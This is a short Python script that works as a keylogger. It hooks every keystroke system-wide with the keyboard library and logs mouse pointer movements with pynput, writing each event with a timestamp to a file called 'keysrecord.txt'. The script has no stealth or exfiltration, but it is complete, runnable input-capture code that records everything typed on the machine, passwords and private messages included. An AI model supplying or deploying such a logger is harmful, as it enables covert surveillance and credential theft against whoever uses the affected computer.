import keyboard
import logging
from pynput.mouse import Controller, Listener

# Create a logger
logger = logging.getLogger(__name__)

# Set the level of the logger. This can be DEBUG, INFO, WARNING, ERROR, CRITICAL.
logger.setLevel(logging.DEBUG)

# Create a file handler
handler = logging.FileHandler('keysrecord.txt')

# Create a formatter and add it to the handler
formatter = logging.Formatter('%(asctime)s - %(message)s')
handler.setFormatter(formatter)

# Add the handler to the logger
logger.addHandler(handler)

def log_keypress(e):
   print(str(e.name))
   logger.info(str(e.name))

keyboard.hook(log_keypress)

def on_move(x, y):
   print('Pointer moved to {0}'.format((x, y)))
   logger.info('Pointer moved to {0}'.format((x, y)))

with Listener(on_move=on_move) as listener:
   listener.join()

while True:
   pass